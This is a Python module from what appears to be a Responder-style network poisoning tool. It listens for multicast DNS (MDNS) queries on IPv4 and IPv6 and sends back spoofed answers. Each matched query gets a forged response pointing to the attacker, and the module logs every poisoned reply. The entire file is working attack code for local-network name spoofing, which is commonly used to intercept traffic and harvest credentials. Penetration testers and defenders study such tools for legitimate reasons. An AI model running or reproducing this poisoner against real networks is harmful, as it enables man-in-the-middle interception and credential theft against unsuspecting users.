#!/usr/bin/env python
from socketserver import BaseRequestHandler
from ..packets import MDNS_Ans, MDNS6_Ans
from ..utils import *

Have_IPv6 = settings.Config.IPv6

def Parse_MDNS_Name(data):
	try:
		data = data[12:]
		NameLen = data[0]
		Name = data[1:1+NameLen]
		NameLen_ = data[1+NameLen]
		Name_ = data[1+NameLen:1+NameLen+NameLen_+1]
		FinalName = Name+b'.'+Name_
		return FinalName.decode("latin-1").replace("\x05","")

	except IndexError:
		return None

def Poisoned_MDNS_Name(data):
	data = RecvBuffer(data[12:])
	return data[:len(data)-5]

class MDNS(BaseRequestHandler):
	def handle(self):
		try:
			data, soc = self.request
			Request_Name = Parse_MDNS_Name(data)
			MDNSType = Parse_IPV6_Addr(data)

			if MDNSType == True:
				Poisoned_Name = Poisoned_MDNS_Name(data)
				Buffer = MDNS_Ans(AnswerName = Poisoned_Name)
				Buffer.calculate()
				soc.sendto(SendBuffer(Buffer), self.client_address)
				if not settings.Config.Quiet:
					print('[*] [MDNS] Poisoned answer sent to %s for name %s' % (self.client_address[0].replace("::ffff:",""), Request_Name))

			elif MDNSType == 'IPv6' and Have_IPv6:
				Poisoned_Name = Poisoned_MDNS_Name(data)
				Buffer = MDNS6_Ans(AnswerName = Poisoned_Name)
				Buffer.calculate()
				soc.sendto(SendBuffer(Buffer), self.client_address)
				if not settings.Config.Quiet:
					print('[*] [MDNS] Poisoned answer sent to %s for name %s' % (self.client_address[0].replace("::ffff:",""), Request_Name))
		except Exception as e:
			print(e)
